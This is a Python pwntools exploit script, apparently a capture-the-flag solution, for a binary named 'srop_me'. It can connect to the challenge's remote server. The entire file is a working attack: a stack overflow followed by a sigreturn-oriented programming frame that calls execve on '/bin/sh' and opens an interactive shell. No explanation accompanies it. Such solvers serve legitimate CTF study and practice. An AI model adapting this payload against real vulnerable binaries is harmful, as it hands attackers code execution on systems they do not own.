#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep


context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./srop_me"
#libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("challs.n00bzunit3d.xyz", 38894)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *vuln+49
		b *vuln+55
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


binsh_addr = next(elf.search(b'/bin/sh\x00'))
syscall_ret = 0x00401047
call_read = 0x0040101f

sigret_frame = SigreturnFrame()
sigret_frame.rax = constants.SYS_execve
sigret_frame.rdi = binsh_addr
sigret_frame.rsi = 0
sigret_frame.rdx = 0
sigret_frame.rip = syscall_ret

payload = b'A' * 0x8 * 4
payload += p64(call_read)
payload += b'A' * 0x8 * 4
payload += p64(syscall_ret)
payload += bytes(sigret_frame)


p.recvuntil("!!")
p.sendline(payload)
sleep(0.5)
p.sendline(b'B' * (0xf - 1))# set rax = 0xf

p.interactive()
